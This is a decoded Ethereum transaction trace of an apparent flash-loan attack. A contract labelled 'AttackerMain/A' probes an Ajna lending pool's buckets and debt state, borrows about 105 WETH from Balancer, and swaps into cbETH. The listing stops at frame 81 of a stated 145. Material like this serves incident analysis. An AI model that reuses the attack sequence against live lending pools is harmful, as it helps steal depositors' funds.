# setup: verified call stack
Transaction: 0x8a8793963c0ef443b9a396665c3c185ded132d5f99daf7c99e87125597016e64
Block: 25854585; frames: 145; receipt events: 30

Frames are zero-based preorder IDs; path is the nested call position. Internal Solidity calls are not separate EVM frames. Unknown selectors remain unnamed. CALL/DELEGATECALL layers describe the same operation and must not be counted repeatedly.

**F000 | path 0 | CALL | 0xac00ffb0**

From: 0x6f2f5236b10fe7162da077a2779f8b5f04b7827e → AttackerMain/A (0x80ad419c4783a09252ad6a576ce059f51cc53d47)
Gas used: 2635305; status: success

**F001 | path 0.0 | STATICCALL | 0x71d62a66**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → 0x5508df70a2454157a54a27473098716687778542 (0x5508df70a2454157a54a27473098716687778542)
Gas used: 451; status: success

**F002 | path 0.1 | STATICCALL | bucketInfo(uint256)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 47847; status: success

```json
{
  "index_": 4151
}
```

Returns:
```json
{
  "0": 50168949911514829567,
  "1": 0,
  "2": 0,
  "3": 49343732557986936488,
  "4": 1004485960499671769
}
```

**F003 | path 0.1.0 | DELEGATECALL | bucketInfo(uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 45126; status: success

```json
{
  "index_": 4151
}
```

Returns:
```json
{
  "0": 50168949911514829567,
  "1": 0,
  "2": 0,
  "3": 49343732557986936488,
  "4": 1004485960499671769
}
```

**F004 | path 0.2 | STATICCALL | bucketInfo(uint256)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 28427; status: success

```json
{
  "index_": 2000
}
```

Returns:
```json
{
  "0": 0,
  "1": 0,
  "2": 0,
  "3": 0,
  "4": 1004568828197116541
}
```

**F005 | path 0.2.0 | DELEGATECALL | bucketInfo(uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 28206; status: success

```json
{
  "index_": 2000
}
```

Returns:
```json
{
  "0": 0,
  "1": 0,
  "2": 0,
  "3": 0,
  "4": 1004568828197116541
}
```

**F006 | path 0.3 | STATICCALL | depositSize()**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 2862; status: success

```json
{}
```

Returns:
```json
{
  "0": 49344017287534079170
}
```

**F007 | path 0.3.0 | DELEGATECALL | depositSize()**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 2659; status: success

```json
{}
```

Returns:
```json
{
  "0": 49344017287534079170
}
```

**F008 | path 0.4 | STATICCALL | debtInfo()**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 18860; status: success

```json
{}
```

Returns:
```json
{
  "0": 0,
  "1": 0,
  "2": 0,
  "3": 0
}
```

**F009 | path 0.4.0 | DELEGATECALL | debtInfo()**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 18648; status: success

```json
{}
```

Returns:
```json
{
  "0": 0,
  "1": 0,
  "2": 0,
  "3": 0
}
```

**F010 | path 0.4.0.0 | DELEGATECALL | pendingInflator(uint256,uint256,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → PoolCommons (0x1f172f881eba06aa7a991651780527c173783cf6)
Gas used: 3388; status: success

```json
{
  "inflator_": 1000000000000000000,
  "inflatorUpdate": 1787930267,
  "interestRate_": 1512868055672164
}
```

Returns:
```json
{
  "0": 1000000002302691106
}
```

**F011 | path 0.5 | STATICCALL | inflatorInfo()**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 628; status: success

```json
{}
```

Returns:
```json
{
  "0": 1000000000000000000,
  "1": 1787930267
}
```

**F012 | path 0.5.0 | DELEGATECALL | inflatorInfo()**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 422; status: success

```json
{}
```

Returns:
```json
{
  "0": 1000000000000000000,
  "1": 1787930267
}
```

**F013 | path 0.6 | STATICCALL | interestRateInfo()**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 551; status: success

```json
{}
```

Returns:
```json
{
  "0": 1512868055672164,
  "1": 1787930267
}
```

**F014 | path 0.6.0 | DELEGATECALL | interestRateInfo()**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 345; status: success

```json
{}
```

Returns:
```json
{
  "0": 1512868055672164,
  "1": 1787930267
}
```

**F015 | path 0.7 | STATICCALL | loansInfo()**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 3898; status: success

```json
{}
```

Returns:
```json
{
  "0": "0x0000000000000000000000000000000000000000",
  "1": 0,
  "2": 0
}
```

**F016 | path 0.7.0 | DELEGATECALL | loansInfo()**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 3689; status: success

```json
{}
```

Returns:
```json
{
  "0": "0x0000000000000000000000000000000000000000",
  "1": 0,
  "2": 0
}
```

**F017 | path 0.8 | STATICCALL | pledgedCollateral()**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 2671; status: success

```json
{}
```

Returns:
```json
{
  "0": 656047343920877587
}
```

**F018 | path 0.8.0 | DELEGATECALL | pledgedCollateral()**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 2468; status: success

```json
{}
```

Returns:
```json
{
  "0": 656047343920877587
}
```

**F019 | path 0.9 | STATICCALL | totalAuctionsInPool()**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 3437; status: success

```json
{}
```

Returns:
```json
{
  "0": 0
}
```

**F020 | path 0.9.0 | DELEGATECALL | totalAuctionsInPool()**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 3234; status: success

```json
{}
```

Returns:
```json
{
  "0": 0
}
```

**F021 | path 0.10 | STATICCALL | balanceOf(address)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 2534; status: success

```json
{
  "account": "0x80ad419c4783a09252ad6a576ce059f51cc53d47"
}
```

Returns:
```json
{
  "0": 6800000000000000000
}
```

**F022 | path 0.11 | STATICCALL | balanceOf(address)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → cbETH (0xbe9895146f7af43049ca1c1ae358b0541ea49704)
Gas used: 9726; status: success

```json
{
  "account": "0x80ad419c4783a09252ad6a576ce059f51cc53d47"
}
```

Returns:
```json
{
  "0": 0
}
```

**F023 | path 0.11.0 | DELEGATECALL | balanceOf(address)**

From: 0xbe9895146f7af43049ca1c1ae358b0541ea49704 → 0x31724ca0c982a31fbb5c57f4217ab585271fc9a5 (0x31724ca0c982a31fbb5c57f4217ab585271fc9a5)
Gas used: 2529; status: success

```json
{
  "account": "0x80ad419c4783a09252ad6a576ce059f51cc53d47"
}
```

Returns:
```json
{
  "0": 0
}
```

**F024 | path 0.12 | STATICCALL | depositUpToIndex(uint256)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 20739; status: success

```json
{
  "index_": 4150
}
```

Returns:
```json
{
  "0": 0
}
```

**F025 | path 0.12.0 | DELEGATECALL | depositUpToIndex(uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 20530; status: success

```json
{
  "index_": 4150
}
```

Returns:
```json
{
  "0": 0
}
```

**F026 | path 0.13 | CALL | flashLoan(address,address[],uint256[],bytes)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → BalancerVault (0xba12222222228d8ba445958a75a0704d566bf2c8)
Gas used: 2633517; status: success

```json
{
  "recipient": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "tokens": [
    "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
  ],
  "amounts": [
    105000000000000000003
  ],
  "userData": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000005b12aefafa8040003000000000000000000000000000000000000000000000000017508f1956a800100000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000009ddf75536d17e4ab00000000000000000000000000000000000000000000000244f2e1a8c2ffb5ef000000000000000000000000000000000000000000000000017508f1956a8001000000000000000000000000000000000000000000000000106f4cb88324fc8b"
}
```

**F027 | path 0.13.0 | STATICCALL | balanceOf(address)**

From: 0xba12222222228d8ba445958a75a0704d566bf2c8 → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 2534; status: success

```json
{
  "account": "0xba12222222228d8ba445958a75a0704d566bf2c8"
}
```

Returns:
```json
{
  "0": 1174119467591794019779
}
```

**F028 | path 0.13.1 | STATICCALL | 0xd877845c**

From: 0xba12222222228d8ba445958a75a0704d566bf2c8 → 0xce88686553686da562ce7cea497ce749da109f9f (0xce88686553686da562ce7cea497ce749da109f9f)
Gas used: 2350; status: success

**F029 | path 0.13.2 | CALL | transfer(address,uint256)**

From: 0xba12222222228d8ba445958a75a0704d566bf2c8 → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 8862; status: success

```json
{
  "to": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "amount": 105000000000000000003
}
```

Returns:
```json
{
  "0": true
}
```

**F030 | path 0.13.3 | CALL | receiveFlashLoan(address[],uint256[],uint256[],bytes)**

From: 0xba12222222228d8ba445958a75a0704d566bf2c8 → AttackerMain/A (0x80ad419c4783a09252ad6a576ce059f51cc53d47)
Gas used: 2600545; status: success

```json
{
  "tokens": [
    "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
  ],
  "amounts": [
    105000000000000000003
  ],
  "feeAmounts": [
    0
  ],
  "userData": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000005b12aefafa8040003000000000000000000000000000000000000000000000000017508f1956a800100000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000009ddf75536d17e4ab00000000000000000000000000000000000000000000000244f2e1a8c2ffb5ef000000000000000000000000000000000000000000000000017508f1956a8001000000000000000000000000000000000000000000000000106f4cb88324fc8b"
}
```

**F031 | path 0.13.3.0 | STATICCALL | 0x71d62a66**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → 0x5508df70a2454157a54a27473098716687778542 (0x5508df70a2454157a54a27473098716687778542)
Gas used: 451; status: success

**F032 | path 0.13.3.1 | STATICCALL | bucketInfo(uint256)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 9347; status: success

```json
{
  "index_": 4151
}
```

Returns:
```json
{
  "0": 50168949911514829567,
  "1": 0,
  "2": 0,
  "3": 49343732557986936488,
  "4": 1004485960499671769
}
```

**F033 | path 0.13.3.1.0 | DELEGATECALL | bucketInfo(uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 9126; status: success

```json
{
  "index_": 4151
}
```

Returns:
```json
{
  "0": 50168949911514829567,
  "1": 0,
  "2": 0,
  "3": 49343732557986936488,
  "4": 1004485960499671769
}
```

**F034 | path 0.13.3.2 | STATICCALL | bucketInfo(uint256)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 6427; status: success

```json
{
  "index_": 2000
}
```

Returns:
```json
{
  "0": 0,
  "1": 0,
  "2": 0,
  "3": 0,
  "4": 1004568828197116541
}
```

**F035 | path 0.13.3.2.0 | DELEGATECALL | bucketInfo(uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 6206; status: success

```json
{
  "index_": 2000
}
```

Returns:
```json
{
  "0": 0,
  "1": 0,
  "2": 0,
  "3": 0,
  "4": 1004568828197116541
}
```

**F036 | path 0.13.3.3 | STATICCALL | depositSize()**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 862; status: success

```json
{}
```

Returns:
```json
{
  "0": 49344017287534079170
}
```

**F037 | path 0.13.3.3.0 | DELEGATECALL | depositSize()**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 659; status: success

```json
{}
```

Returns:
```json
{
  "0": 49344017287534079170
}
```

**F038 | path 0.13.3.4 | STATICCALL | debtInfo()**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 6360; status: success

```json
{}
```

Returns:
```json
{
  "0": 0,
  "1": 0,
  "2": 0,
  "3": 0
}
```

**F039 | path 0.13.3.4.0 | DELEGATECALL | debtInfo()**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 6148; status: success

```json
{}
```

Returns:
```json
{
  "0": 0,
  "1": 0,
  "2": 0,
  "3": 0
}
```

**F040 | path 0.13.3.4.0.0 | DELEGATECALL | pendingInflator(uint256,uint256,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → PoolCommons (0x1f172f881eba06aa7a991651780527c173783cf6)
Gas used: 3388; status: success

```json
{
  "inflator_": 1000000000000000000,
  "inflatorUpdate": 1787930267,
  "interestRate_": 1512868055672164
}
```

Returns:
```json
{
  "0": 1000000002302691106
}
```

**F041 | path 0.13.3.5 | STATICCALL | inflatorInfo()**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 628; status: success

```json
{}
```

Returns:
```json
{
  "0": 1000000000000000000,
  "1": 1787930267
}
```

**F042 | path 0.13.3.5.0 | DELEGATECALL | inflatorInfo()**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 422; status: success

```json
{}
```

Returns:
```json
{
  "0": 1000000000000000000,
  "1": 1787930267
}
```

**F043 | path 0.13.3.6 | STATICCALL | interestRateInfo()**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 551; status: success

```json
{}
```

Returns:
```json
{
  "0": 1512868055672164,
  "1": 1787930267
}
```

**F044 | path 0.13.3.6.0 | DELEGATECALL | interestRateInfo()**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 345; status: success

```json
{}
```

Returns:
```json
{
  "0": 1512868055672164,
  "1": 1787930267
}
```

**F045 | path 0.13.3.7 | STATICCALL | loansInfo()**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 1898; status: success

```json
{}
```

Returns:
```json
{
  "0": "0x0000000000000000000000000000000000000000",
  "1": 0,
  "2": 0
}
```

**F046 | path 0.13.3.7.0 | DELEGATECALL | loansInfo()**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 1689; status: success

```json
{}
```

Returns:
```json
{
  "0": "0x0000000000000000000000000000000000000000",
  "1": 0,
  "2": 0
}
```

**F047 | path 0.13.3.8 | STATICCALL | pledgedCollateral()**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 671; status: success

```json
{}
```

Returns:
```json
{
  "0": 656047343920877587
}
```

**F048 | path 0.13.3.8.0 | DELEGATECALL | pledgedCollateral()**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 468; status: success

```json
{}
```

Returns:
```json
{
  "0": 656047343920877587
}
```

**F049 | path 0.13.3.9 | STATICCALL | totalAuctionsInPool()**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 1437; status: success

```json
{}
```

Returns:
```json
{
  "0": 0
}
```

**F050 | path 0.13.3.9.0 | DELEGATECALL | totalAuctionsInPool()**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 1234; status: success

```json
{}
```

Returns:
```json
{
  "0": 0
}
```

**F051 | path 0.13.3.10 | STATICCALL | balanceOf(address)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 534; status: success

```json
{
  "account": "0x80ad419c4783a09252ad6a576ce059f51cc53d47"
}
```

Returns:
```json
{
  "0": 111800000000000000003
}
```

**F052 | path 0.13.3.11 | STATICCALL | balanceOf(address)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → cbETH (0xbe9895146f7af43049ca1c1ae358b0541ea49704)
Gas used: 1226; status: success

```json
{
  "account": "0x80ad419c4783a09252ad6a576ce059f51cc53d47"
}
```

Returns:
```json
{
  "0": 0
}
```

**F053 | path 0.13.3.11.0 | DELEGATECALL | balanceOf(address)**

From: 0xbe9895146f7af43049ca1c1ae358b0541ea49704 → 0x31724ca0c982a31fbb5c57f4217ab585271fc9a5 (0x31724ca0c982a31fbb5c57f4217ab585271fc9a5)
Gas used: 529; status: success

```json
{
  "account": "0x80ad419c4783a09252ad6a576ce059f51cc53d47"
}
```

Returns:
```json
{
  "0": 0
}
```

**F054 | path 0.13.3.12 | STATICCALL | balanceOf(address)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → cbETH (0xbe9895146f7af43049ca1c1ae358b0541ea49704)
Gas used: 1226; status: success

```json
{
  "account": "0x80ad419c4783a09252ad6a576ce059f51cc53d47"
}
```

Returns:
```json
{
  "0": 0
}
```

**F055 | path 0.13.3.12.0 | DELEGATECALL | balanceOf(address)**

From: 0xbe9895146f7af43049ca1c1ae358b0541ea49704 → 0x31724ca0c982a31fbb5c57f4217ab585271fc9a5 (0x31724ca0c982a31fbb5c57f4217ab585271fc9a5)
Gas used: 529; status: success

```json
{
  "account": "0x80ad419c4783a09252ad6a576ce059f51cc53d47"
}
```

Returns:
```json
{
  "0": 0
}
```

**F056 | path 0.13.3.13 | CALL | 0x5b41b908**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → 0x5fae7e604fc3e24fd43a72867cebac94c65b404a (0x5fae7e604fc3e24fd43a72867cebac94c65b404a)
Gas used: 289535; status: success

**F057 | path 0.13.3.13.0 | DELEGATECALL | 0x5b41b908**

From: 0x5fae7e604fc3e24fd43a72867cebac94c65b404a → 0xa85461afc2deec01bda23b5cd267d51f765fba10 (0xa85461afc2deec01bda23b5cd267d51f765fba10)
Gas used: 286845; status: success

**F058 | path 0.13.3.13.0.0 | CALL | transferFrom(address,address,uint256)**

From: 0x5fae7e604fc3e24fd43a72867cebac94c65b404a → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 10225; status: success

```json
{
  "from": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "to": "0x5fae7e604fc3e24fd43a72867cebac94c65b404a",
  "amount": 13030742916108556438
}
```

Returns:
```json
{
  "0": true
}
```

**F059 | path 0.13.3.13.0.1 | STATICCALL | 0x00000000**

From: 0x5fae7e604fc3e24fd43a72867cebac94c65b404a → 0x0000000000000000000000000000000000000004 (0x0000000000000000000000000000000000000004)
Gas used: 21; status: success

**F060 | path 0.13.3.13.0.2 | CALL | 0x2e1a7d4d**

From: 0x5fae7e604fc3e24fd43a72867cebac94c65b404a → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 9333; status: success

**F061 | path 0.13.3.13.0.2.0 | CALL | 0x**

From: 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2 → 0x5fae7e604fc3e24fd43a72867cebac94c65b404a (0x5fae7e604fc3e24fd43a72867cebac94c65b404a)
Gas used: 193; status: success

**F062 | path 0.13.3.13.0.2.0.0 | DELEGATECALL | 0x**

From: 0x5fae7e604fc3e24fd43a72867cebac94c65b404a → 0xa85461afc2deec01bda23b5cd267d51f765fba10 (0xa85461afc2deec01bda23b5cd267d51f765fba10)
Gas used: 36; status: success

**F063 | path 0.13.3.13.0.3 | CALL | transfer(address,uint256)**

From: 0x5fae7e604fc3e24fd43a72867cebac94c65b404a → cbETH (0xbe9895146f7af43049ca1c1ae358b0541ea49704)
Gas used: 35383; status: success

```json
{
  "to": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "amount": 11375940184934180011
}
```

Returns:
```json
{
  "0": true
}
```

**F064 | path 0.13.3.13.0.3.0 | DELEGATECALL | transfer(address,uint256)**

From: 0xbe9895146f7af43049ca1c1ae358b0541ea49704 → 0x31724ca0c982a31fbb5c57f4217ab585271fc9a5 (0x31724ca0c982a31fbb5c57f4217ab585271fc9a5)
Gas used: 34683; status: success

```json
{
  "to": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "amount": 11375940184934180011
}
```

Returns:
```json
{
  "0": true
}
```

**F065 | path 0.13.3.13.0.4 | STATICCALL | 0x00000000**

From: 0x5fae7e604fc3e24fd43a72867cebac94c65b404a → 0x0000000000000000000000000000000000000004 (0x0000000000000000000000000000000000000004)
Gas used: 21; status: success

**F066 | path 0.13.3.13.0.5 | STATICCALL | 0x18160ddd**

From: 0x5fae7e604fc3e24fd43a72867cebac94c65b404a → 0x5b6c539b224014a09b3388e51caaa8e354c959c8 (0x5b6c539b224014a09b3388e51caaa8e354c959c8)
Gas used: 5279; status: success

**F067 | path 0.13.3.13.0.5.0 | DELEGATECALL | 0x18160ddd**

From: 0x5b6c539b224014a09b3388e51caaa8e354c959c8 → 0xc08550a4cc5333f40e593ecc4c4724808085d304 (0xc08550a4cc5333f40e593ecc4c4724808085d304)
Gas used: 2613; status: success

**F068 | path 0.13.3.14 | STATICCALL | balanceOf(address)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → cbETH (0xbe9895146f7af43049ca1c1ae358b0541ea49704)
Gas used: 1226; status: success

```json
{
  "account": "0x80ad419c4783a09252ad6a576ce059f51cc53d47"
}
```

Returns:
```json
{
  "0": 11375940184934180011
}
```

**F069 | path 0.13.3.14.0 | DELEGATECALL | balanceOf(address)**

From: 0xbe9895146f7af43049ca1c1ae358b0541ea49704 → 0x31724ca0c982a31fbb5c57f4217ab585271fc9a5 (0x31724ca0c982a31fbb5c57f4217ab585271fc9a5)
Gas used: 529; status: success

```json
{
  "account": "0x80ad419c4783a09252ad6a576ce059f51cc53d47"
}
```

Returns:
```json
{
  "0": 11375940184934180011
}
```

**F070 | path 0.13.3.15 | CALL | exactOutputSingle((address,address,uint24,address,uint256,uint256,uint256,uint160))**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → 0x00c9027573295ce079aa3b33f2f5c28ed62c9a77 (0x00c9027573295ce079aa3b33f2f5c28ed62c9a77)
Gas used: 280667; status: success

```json
{
  "0": [
    "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
    "0xbe9895146f7af43049ca1c1ae358b0541ea49704",
    500,
    "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
    1787930615,
    36753544098997828600,
    41861769601304475119,
    0
  ]
}
```

**F071 | path 0.13.3.15.0 | STATICCALL | 0x71d62a66**

From: 0x00c9027573295ce079aa3b33f2f5c28ed62c9a77 → 0x5508df70a2454157a54a27473098716687778542 (0x5508df70a2454157a54a27473098716687778542)
Gas used: 451; status: success

**F072 | path 0.13.3.15.1 | STATICCALL | balanceOf(address)**

From: 0x00c9027573295ce079aa3b33f2f5c28ed62c9a77 → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 2534; status: success

```json
{
  "account": "0x00c9027573295ce079aa3b33f2f5c28ed62c9a77"
}
```

Returns:
```json
{
  "0": 0
}
```

**F073 | path 0.13.3.15.2 | STATICCALL | balanceOf(address)**

From: 0x00c9027573295ce079aa3b33f2f5c28ed62c9a77 → cbETH (0xbe9895146f7af43049ca1c1ae358b0541ea49704)
Gas used: 3226; status: success

```json
{
  "account": "0x00c9027573295ce079aa3b33f2f5c28ed62c9a77"
}
```

Returns:
```json
{
  "0": 0
}
```

**F074 | path 0.13.3.15.2.0 | DELEGATECALL | balanceOf(address)**

From: 0xbe9895146f7af43049ca1c1ae358b0541ea49704 → 0x31724ca0c982a31fbb5c57f4217ab585271fc9a5 (0x31724ca0c982a31fbb5c57f4217ab585271fc9a5)
Gas used: 2529; status: success

```json
{
  "account": "0x00c9027573295ce079aa3b33f2f5c28ed62c9a77"
}
```

Returns:
```json
{
  "0": 0
}
```

**F075 | path 0.13.3.15.3 | STATICCALL | balanceOf(address)**

From: 0x00c9027573295ce079aa3b33f2f5c28ed62c9a77 → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 534; status: success

```json
{
  "account": "0x00c9027573295ce079aa3b33f2f5c28ed62c9a77"
}
```

Returns:
```json
{
  "0": 0
}
```

**F076 | path 0.13.3.15.4 | STATICCALL | balanceOf(address)**

From: 0x00c9027573295ce079aa3b33f2f5c28ed62c9a77 → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 534; status: success

```json
{
  "account": "0x80ad419c4783a09252ad6a576ce059f51cc53d47"
}
```

Returns:
```json
{
  "0": 98769257083891443565
}
```

**F077 | path 0.13.3.15.5 | CALL | transferFrom(address,address,uint256)**

From: 0x00c9027573295ce079aa3b33f2f5c28ed62c9a77 → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 25325; status: success

```json
{
  "from": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "to": "0x00c9027573295ce079aa3b33f2f5c28ed62c9a77",
  "amount": 41861769601304475119
}
```

Returns:
```json
{
  "0": true
}
```

**F078 | path 0.13.3.15.6 | CALL | 0x414bf389**

From: 0x00c9027573295ce079aa3b33f2f5c28ed62c9a77 → 0xe592427a0aece92de3edee1f18e0157c05861564 (0xe592427a0aece92de3edee1f18e0157c05861564)
Gas used: 78178; status: success

**F079 | path 0.13.3.15.6.0 | CALL | swap(address,bool,int256,uint160,bytes)**

From: 0xe592427a0aece92de3edee1f18e0157c05861564 → 0x177622e79acece98c39f6e12fa78ac7fc8a8bf62 (0x177622e79acece98c39f6e12fa78ac7fc8a8bf62)
Gas used: 70734; status: success

```json
{
  "0": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "1": false,
  "2": 4750000000000000000,
  "3": 84514962790478625998098059913,
  "4": "0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000c9027573295ce079aa3b33f2f5c28ed62c9a77000000000000000000000000000000000000000000000000000000000000002bc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000064be9895146f7af43049ca1c1ae358b0541ea49704000000000000000000000000000000000000000000"
}
```

**F080 | path 0.13.3.15.6.0.0 | CALL | transfer(address,uint256)**

From: 0x177622e79acece98c39f6e12fa78ac7fc8a8bf62 → cbETH (0xbe9895146f7af43049ca1c1ae358b0541ea49704)
Gas used: 11483; status: success

```json
{
  "to": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "amount": 4176143520730184416
}
```

Returns:
```json
{
  "0": true
}
```

**F081 | path 0.13.3.15.6.0.0.0 | DELEGATECALL | transfer(address,uint256)**

